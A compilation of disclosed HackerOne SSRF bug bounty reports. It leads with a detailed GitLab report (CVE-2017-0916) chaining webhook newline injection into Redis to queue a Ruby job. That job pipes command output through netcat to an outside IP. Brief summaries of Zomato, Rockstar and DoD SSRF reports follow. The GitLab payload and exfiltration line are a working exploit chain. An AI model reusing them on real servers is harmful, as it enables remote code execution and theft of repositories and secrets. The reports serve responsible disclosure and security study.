### [Evaluating Ruby code by injecting Rescue job on the system_hook_push queue through web hook](https://hackerone.com/reports/299473)

- **Report ID:** `299473`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** GitLab
- **Reporter:** @jobert
- **Bounty:** 750 usd
- **Disclosed:** 2018-04-27T02:21:14.315Z
- **CVE(s):** CVE-2017-0916

**Vulnerability Information:**

The secret token field of a webhook is vulnerable to a new line injection, allowing an attacker to inject non-HTTP commands in a TCP stream. When a GitLab instance is configured with an external Redis instance, e.g. on `127.0.0.1:6379`, it may result in arbitrary code execution on a Sidekiq worker by abusing a blind Server-Side Request Forgery (SSRF) vulnerability in the webhook integration and the new line injection. One of my other reports regarding these SSRFs, #131190, is still open and has been for more than a year. However, because this is a service I haven't reported the SSRF in and chaining it with the new line injection increases the severity of the vulnerability, I decided to report it. To reproduce, start by signing in to the GitLab instance and creating a new project.

To reproduce the RCE, a Redis server has to be running on port 6379. Follow the GitLab documentation to set up the Redis server and reconfigure GitLab by running `gitlab-ctl reconfigure`. When that's done, continue to go to the Integrations section of the created project. Intercept your network traffic before continuing. Now, enter `http://127.0.0.1:6379/` as the webhook endpoint and `A` as the secret token. When the request is submitted, a request similar to the one below is submitted:

**Request**
```
POST /root/test/hooks HTTP/1.1
Host: gitlab-instance
...
----------1282688597
Content-Disposition: form-data; name="hook[url]"

http://127.0.0.1:6379/
----------1282688597
Content-Disposition: form-data; name="hook[token]"

A
...
```

In the request above I changed the body encoding to make it easier to inject the payload. Now, replace the `hook[token]` field with the payload below.

**Payload**
```
A
 multi
 sadd resque:gitlab:queues system_hook_push
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|whoami | nc 192.241.233.143 80\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
 exec
```

Then, when the integration persisted, click the `Test` button next to the newly created integration. Here's what happens next: a `POST` request will be submitted to `127.0.0.1`, port `6379` (Redis). Redis is pretty easy on errors, so it'll simply ignore the first couple lines of the HTTP request. Then, a couple headers further down, it is including the `X-GitLab-Token` that is vulnerable to the new line injection. Here's the entire request that is posted:

**Injected request**
```
POST / HTTP/1.1
Content-Type: application/json
X-Gitlab-Event: Push Hook
X-Gitlab-Token: A
 multi
 sadd resque:gitlab:queues system_hook_push
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|whoami | nc 192.241.233.143 80\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
 exec
 exec
Connection: close
Host: 192.241.233.143
Content-Length: 2495

{"object_kind":"push","ev<...>
```

When this is submitted to Redis, a new job will be shifted on the `system_hook_push` command. In order to evaluate Ruby code, I needed a Ruby class that'd implement the `perform` method that would allow me to execute a command or Ruby. The `GitlabShellWorker` was exactly what I was looking for:

**GitlabShellWorker**
```ruby
class GitlabShellWorker
  include ApplicationWorker
  include Gitlab::ShellAdapter

  def perform(action, *arg)
    gitlab_shell.__send__(action, *arg) # rubocop:disable GitlabSecurity/PublicSend
  end
end
```

As can be seen in the payload, the `GitlabShellWorker` is called with the arguments `class_eval` and the following Ruby code:

```
open('|whoami | nc 192.241.233.143 80').read
```

Because the Ruby is evaluated on a Sidekiq server, we need to exfiltrate the output of a command through `nc` or a similar tool. In this example, my server is listening on port 80 for connections. When the payload fires, it captures the output of the `whoami` command:

```
$ nc -l -n -vv -p 80
Listening on [0.0.0.0] (family 0, port 80)
Connection from [104.236.178.103] port 80 [tcp/*] accepted (family 2, sport 42874)
git
```

Besides the blind SSRF, the underlying vulnerability is the new line injection in the secret token. Fixing the new line injection seems mitigate the immediate risk for an RCE, but I'd encourage you to reprioritize the fix for the SSRF vulnerabilities in the services (reported by me previously). Let me know if you have any questions.

## Impact

An attacker can execute arbitrary system commands on the server, which exposes access to all git repositories, database, and potentially other secrets that may be used to escalate this further.

---

### [SSRF in https://www.zomato.com████ allows reading local files and website source code](https://hackerone.com/reports/271224)

- **Report ID:** `271224`
- **Severity:** Critical
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** Eternal
- **Reporter:** @adibou
- **Bounty:** - usd
- **Disclosed:** 2018-02-28T10:18:41.563Z
- **CVE(s):** -

**Summary (team):**

@nbsp found a SSRF vulnerability which leads to read local files from the web server (source code & system files). 
We have resolved the issue quickly and rewarded the researcher.

---

### [SMB SSRF in emblem editor exposes taketwo domain credentials, may lead to RCE](https://hackerone.com/reports/288353)

- **Report ID:** `288353`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** Rockstar Games
- **Reporter:** @alexbirsan
- **Bounty:** 1500 usd
- **Disclosed:** 2018-01-12T15:55:48.377Z
- **CVE(s):** -

**Summary (team):**

In this report, the researcher found that by submitting crafted SVG files, he was able to establish a listener on our server that enabled SSRF attacks. This potentially could have been pivoted to carry out more damaging attacks as well. We improved our validation of user-submitted SVG files to prevent this from happening in the future.

**Summary (researcher):**

I found that Imagemagick would happily send the users' login and NTLMv2 hash to remote attackers when processing UNC paths. This could be leveraged to crack the server password offline or potentially in an SMB relay attack.

Thanks to Dirk Lemstra for fixing this in Imagemagick too!
https://github.com/ImageMagick/librsvg/commit/f9d69eadd2b16b00d1a1f9f286122123f8e547dd

---

### [Limited code execution vulnerability on a DoD website](https://hackerone.com/reports/229199)

- **Report ID:** `229199`
- **Severity:** High
- **Weakness:** Server-Side Request Forgery (SSRF)
- **Program:** U.S. Dept Of Defense
- **Reporter:** @sp1d3rs
- **Bounty:** - usd
- **Disclosed:** 2017-07-05T20:00:41.407Z
- **CVE(s):** -

**Summary (team):**

A DoD website was misconfigured in a manner that could have allowed an attacker to execute some malicious code. @sp1d3rs was able to demonstrate this vulnerability by crafting a specially formatted URL. Thank you for notifying us of this vulnerability!

**Summary (researcher):**

This bug was an interesting one. I will write extended summary later.

---
